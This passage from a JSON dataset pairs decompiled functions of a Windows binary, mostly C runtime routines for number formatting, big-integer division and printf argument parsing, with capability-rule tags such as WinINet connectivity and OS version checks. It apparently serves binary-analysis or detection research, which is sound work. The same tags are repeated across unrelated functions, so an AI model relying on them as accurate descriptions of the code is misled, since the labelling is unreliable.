{\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x00472bd6;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.00404863();\n        cVar3 = fcn.00401a8c(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x00472bcd:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x00472be9;\n            }\n            goto code_r0x00472be5;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405d21();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x00472bcd;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x00472be5;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.00404863();\ncode_r0x00472be9:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x00472bd6:\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        if (uVar11 != 0) {\ncode_r0x00472be5:\n            if (uVar11 != 10) goto code_r0x00472be9;\n        }\n    }\n    fcn.0040375b(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.00401a8c(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405d21();\n            }\n            uVar12 = fcn.0040173a(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = \"0123456789ABCDEFabcdef-+Xx\"[uVar12];\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x4c);\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x00472d21;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00405d21();\n                    iVar4 = *(iVar8 + 6);\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x00472d21;\n                fcn.00404543(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.00404863();\n            cVar3 = fcn.00401a8c(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x00472d21:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x00472d45;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x00472d45:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x00472dbc:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x00472dbc;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x00472dbc;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00402a0e();\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 3026
    },
    "00404818": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004ba6e8)\n// WARNING: Removing unreachable block (ram,0x004ba6c3)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00404818(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t *puVar3;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint var_21ch;\n    uint var_218h;\n    uint32_t *var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t *var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t **var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar7 = *arg_8h;\n    if ((uVar7 != 0) && (var_34h = *arg_ch,  var_34h != 0)) {\n        uVar5 = var_34h - 1;\n        uVar2 = uVar7 - 1;\n        if (uVar5 == 0) {\n            var_8h = arg_ch[1];\n            if (var_8h == 1) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.004bc06c(arg_8h + 1, 0x1cc, &var_218h, 0);\n                return uVar7;\n            }\n            if (uVar2 == 0) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.004bc06c(arg_8h + 1, 0x1cc, &var_218h, 0);\n                uVar5 = uVar7 % var_8h;\n                arg_8h[1] = uVar5;\n                *arg_8h = uVar5 != 0;\n                return uVar7 / var_8h;\n            }\n            uVar5 = 0;\n            var_ch = 0;\n            var_24h = 0;\n            var_18h = NULL;\n            if (uVar2 != 0xffffffff) {\n                var_1ch = arg_8h + uVar7;\n                puVar3 = arg_8h;\n                do {\n                    puVar1 = puVar3;\n                    puVar3 = *var_1ch;\n                    uVar11 = fcn.00401820(puVar3, uVar5, var_8h, 0, puVar1);\n                    var_40h = uVar11 >> 0x20;\n                    var_24h = var_ch;\n                    var_1ch = var_1ch + -1;\n                    uVar7 = uVar7 - 1;\n                    uVar5 = extraout_ECX;\n                    var_18h = puVar1;\n                    var_ch = uVar11;\n                } while (uVar7 != 0);\n            }\n            *arg_8h = 0;\n            fcn.004bc06c(arg_8h + 1, 0x1cc, &var_218h, 0);\n            arg_8h[1] = uVar5;\n            arg_8h[2] = var_18h;\n            *arg_8h = (var_18h != NULL) + 1;\n            return CONCAT44(var_24h, var_ch);\n        }\n        if (uVar5 <= uVar2) {\n            iVar6 = uVar2 - uVar5;\n            if (iVar6 <= uVar2) {\n                puVar3 = arg_8h + uVar7;\n                puVar1 = arg_ch + var_34h;\n                uVar7 = uVar2;\n                do {\n                    if (*puVar1 != *puVar3) {\n                        if (*puVar3 <= *puVar1) goto code_r0x004ba53c;\n                        break;\n                    }\n                    uVar7 = uVar7 - 1;\n                    puVar1 = puVar1 + -1;\n                    puVar3 = puVar3 + -1;\n                } while (iVar6 <= uVar7);\n            }\n            iVar6 = iVar6 + 1;\ncode_r0x004ba53c:\n            if (iVar6 != 0) {\n                var_30h = arg_ch[var_34h];\n                var_20h = arg_ch[var_34h - 1];\n                var_ch = 0x1f;\n                if (var_30h != 0) {\n                    for (; var_30h >> var_ch == 0; var_ch = var_ch + -1) {\n                    }\n                }\n                if (var_30h == 0) {\n                    var_ch = 0x20;\n                }\n                else {\n                    var_ch = 0x1f - var_ch;\n                }\n                var_2ch = 0x20 - var_ch;\n                if (var_ch != 0) {\n                    uVar7 = var_20h >> (var_2ch & 0x1f);\n                    var_20h = var_20h << (var_ch & 0x1f);\n                    var_30h = var_30h << (var_ch & 0x1f) | uVar7;\n                    if (2 < var_34h) {\n                        var_20h = var_20h | arg_ch[var_34h - 2] >> (var_2ch & 0x1f);\n                    }\n                }\n                var_1ch = NULL;\n                var_18h = iVar6 + -1;\n                uVar8 = 0;\n                var_8h = uVar2;\n                if (-1 < var_18h) {\n                    var_38h = var_18h + var_34h;\n                    var_3ch = arg_8h + iVar6;\n                    var_4ch = arg_8h + (var_38h - 1);\n                    do {\n                        if (var_8h < var_38h) {\n                            var_48h = 0;\n                        }\n                        else {\n                            var_48h = var_4ch[2];\n                        }\n                        uVar7 = var_4ch[1];\n                        var_14h = *var_4ch;\n                        var_24h = 0;\n                        var_4h = var_48h;\n                        if (var_ch != 0) {\n                            uVar7 = var_14h >> (var_2ch & 0x1f);\n                            uVar11 = fcn.00404147();\n                            var_4h = uVar11 >> 0x20;\n                            uVar7 = uVar7 | uVar11;\n                            var_14h = var_14h << (var_ch & 0x1f);\n                            if (2 < var_38h) {\n                                var_14h = var_14h | arg_8h[var_34h + var_18h + -2] >> (var_2ch & 0x1f);\n                            }\n                        }\n                        uVar12 = fcn.00401820(uVar7, var_4h, var_30h, 0, arg_8h);\n                        var_24h = 0;\n                        uVar15 = extraout_ECX_00;\n                        if (uVar12 >> 0x20 != 0) {\n                            _var_44h = uVar12;\n                            iVar13 = fcn.00402685(uVar12 - 0xffffffff, var_30h, 0);\n                            var_10h = uVar12 >> 0x20;\n                            var_4h = uVar12;\n                            uVar15 = iVar13 + 4;\n                            uVar12 = 0xffffffff;\n                        }\n                        var_24h = uVar15 >> 0x20;\n                        while (_var_44h = uVar12,  var_24h == 0) {\n                            var_10h = uVar12 >> 0x20;\n                            var_44h = uVar12;\n                            iVar6 = var_44h;\n                            var_24h = uVar15 >> 0x20;\n                            uVar7 = uVar15;\n                            var_40h = var_10h;\n                            var_4h = var_14h;\n                            uVar15 = uVar12;\n                            uVar14 = fcn.00402685();\n                            var_10h = uVar15 >> 0x20;\n                            var_44h = uVar15;\n                            _var_44h = uVar15 & 0xffffffff | var_40h << 0x20;\n                            uVar12 = uVar15 & 0xffffffff00000000 | uVar12 & 0xffffffff;\n                            if (uVar14 <= CONCAT44(uVar7, var_4h)) break;\n                            uVar12 = CONCAT44(var_10h + -1 + (iVar6 != 0), iVar6 + -1);\n                            var_24h = var_24h + CARRY4(uVar7, var_30h);\n                            uVar15 = CONCAT44(var_24h, uVar7 + var_30h);\n                        }\n                        var_40h = _var_44h >> 0x20;\n                        if (uVar12 != 0) {\n                            uVar5 = 0;\n                            uVar7 = 0;\n                            if (var_34h != 0) {\n                                puVar1 = arg_ch + 1;\n                                var_14h = var_34h;\n                                puVar3 = var_3ch;\n                                do {\n                                    iVar13 = (_var_44h & 0xffffffff) * *puVar1;\n                                    uVar2 = iVar13;\n                                    uVar9 = uVar5 + uVar2;\n                                    uVar5 = uVar7 + (iVar13 >> 0x20) + var_40h * *puVar1 + CARRY4(uVar5, uVar2);\n                                    uVar7 = 0;\n                                    if (*puVar3 < uVar9) {\n                                        bVar10 = 0xfffffffe < uVar5;\n                                        uVar5 = uVar5 + 1;\n                                        uVar7 = bVar10;\n                                    }\n                                    *puVar3 = *puVar3 - uVar9;\n                                    puVar3 = puVar3 + 1;\n                                    puVar1 = puVar1 + 1;\n                                    var_14h = var_14h - 1;\n                                } while (var_14h != 0);\n                            }\n                            if ((uVar7 != 0) || (var_48h < uVar5)) {\n                                if (var_34h != 0) {\n                                    uVar5 = 0;\n                                    puVar1 = var_3ch;\n                                    uVar7 = var_34h;\n                                    puVar3 = arg_ch;\n                                    do {\n                                        puVar3 = puVar3 + 1;\n                                        uVar2 = *puVar1;\n                                        uVar9 = *puVar3;\n                                        uVar4 = uVar2 + *puVar3;\n                                        *puVar1 = uVar4 + uVar5;\n                                        uVar5 = CARRY4(uVar2, uVar9) + CARRY4(uVar4, uVar5);\n                                        uVar7 = uVar7 - 1;\n                                        puVar1 = puVar1 + 1;\n                                    } while (uVar7 != 0);\n                                }\n                                uVar12 = uVar12 - 1;\n                            }\n                            var_8h = var_38h - 1;\n                        }\n                        var_10h = uVar12 >> 0x20;\n                        var_3ch = var_3ch + -1;\n                        var_18h = var_18h + -1;\n                        var_4ch = var_4ch + -1;\n                        var_38h = var_38h - 1;\n                        uVar8 = var_1ch;\n                        var_1ch = uVar12;\n                    } while (-1 < var_18h);\n                }\n                uVar7 = var_8h + 1;\n                if (uVar7 < *arg_8h) {\n                    puVar3 = arg_8h + var_8h + 2;\n                    uVar5 = uVar7;\n                    do {\n                        *puVar3 = 0;\n                        puVar3 = puVar3 + 1;\n                        uVar5 = uVar5 + 1;\n                    } while (uVar5 < *arg_8h);\n                }\n                *arg_8h = uVar7;\n                while ((uVar7 != 0 && (arg_8h[uVar7] == 0))) {\n                    uVar7 = uVar7 - 1;\n                    *arg_8h = uVar7;\n                }\n                return CONCAT44(uVar8, var_1ch);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3053
    },
    "0040481d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040481d(void)\n\n{\n    uint in_MXCSR;\n    uint var_4h;\n    \n    if (0 < *0x573c4c) {\n        return in_MXCSR;\n    }\n    return 0;\n}\n",
        "token_count": 56
    },
    "00404822": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404822(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 297
    },
    "0040483b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.0040483b(int32_t *param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00402efa(param_1);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004048a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048a9(uint *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 1) != '\\0') {\n        return *param_1;\n    }\n    fcn.0040366b(L\"_is_double\", L\"__crt_strtox::floating_point_value::as_double\", \n                 L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x19f, 0);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "004048cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.004048cc(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4502c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"vmvuhliixgidjpyljpsaxhwufijqqwtl\");\n    for (iStack108 = 0x3b; 0 < iStack108; iStack108 = iStack108 + -1) {\n    }\n    for (iStack112 = 0x26; 0 < iStack112; iStack112 = iStack112 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546b74;\n}\n",
        "token_count": 267
    },
    "00404908": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404908(void)\n\n{\n    uint arg_10h;\n    \n    if (*0x5754ab == '\\0') {\n        *0x5754a0 = 0x571fb0;\n        *0x57549c = 0x572378;\n        *0x575498 = 0x572240;\n        arg_10h = fcn.00405655();\n        fcn.004c80b7(0xfffffffd, 1, arg_10h, 0x5754a0);\n        *0x5754ab = '\\x01';\n    }\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404912": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00404912(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack112;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x44ff40;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"mywxmtwdyatfuoytpfovmeicvpmbgvwaqmxud\");\n    for (iStack112 = 0x44; 0 < iStack112; iStack112 = iStack112 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546914;\n}\n",
        "token_count": 233
    },
    "0040498f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040498f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004028c4(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "00404a98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00404a98(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    char cVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    char *var_8h;\n    uint var_4h;\n    \n    *arg_8h = *arg_ch;\n    uVar2 = arg_ch[1];\n    arg_8h[1] = uVar2;\n    if (uVar2 < '\\x02') {\n        if (**0x574458 == '\\0') {\n            fcn.004017df(1);\n            fcn.004053b7(&var_8h, arg_8h);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n        }\n        else {\n            fcn.00401622(&var_8h);\n            fcn.0040330f(&var_10h, 0x20);\n            puVar1 = fcn.004053b7(&var_18h, arg_8h);\n            *arg_8h = *puVar1;\n            uVar2 = puVar1[1];\n            arg_8h[1] = uVar2;\n            if (uVar2 < '\\x02') {\n                if (**0x574458 != '@') {\n                    var_8h = \"{for \";\n                    var_4h = 5;\n                    do {\n                        fcn.00405d71(&var_8h);\n                        cVar3 = *(arg_8h + 1);\n                        do {\n                            if ('\\x01' < cVar3) goto code_r0x00493237;\n                            if (**0x574458 == '\\0') {\ncode_r0x0049321c:\n                                if (**0x574458 == '\\0') {\n                                    fcn.0040658c(1);\n                                }\n                                fcn.00403d55(0x7d);\ncode_r0x00493237:\n                                if (**0x574458 != '@') {\n                                    return arg_8h;\n                                }\n                                goto code_r0x0049323c;\n                            }\n                            if (**0x574458 == '@') {\n                                if (cVar3 < '\\x02') goto code_r0x0049321c;\n                                goto code_r0x00493237;\n                            }\n                            uVar2 = fcn.00403a80(&var_18h);\n                            fcn.00402eb4(&var_10h, 0x60, uVar2);\n                            uVar2 = fcn.0040330f(&var_20h, 0x27);\n                            fcn.00402eeb(uVar2);\n                            if (**0x574458 == '@') {\n                                *0x574458 = *0x574458 + 1;\n                            }\n                            cVar3 = *(arg_8h + 1);\n                            if ('\\x01' < cVar3) goto code_r0x00493237;\n                        } while (**0x574458 == '@');\n                        var_8h = 0x555bf8;\n                        var_4h = 2;\n                    } while( true );\n                }\ncode_r0x0049323c:\n                *0x574458 = *0x574458 + 1;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 749
    },
    "00404ae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404ae8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00404999(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.004028c4(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 437
    },
    "00404b24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404b24(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 107
    },
    "00404b29": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b29(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 341
    },
    "00404b33": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
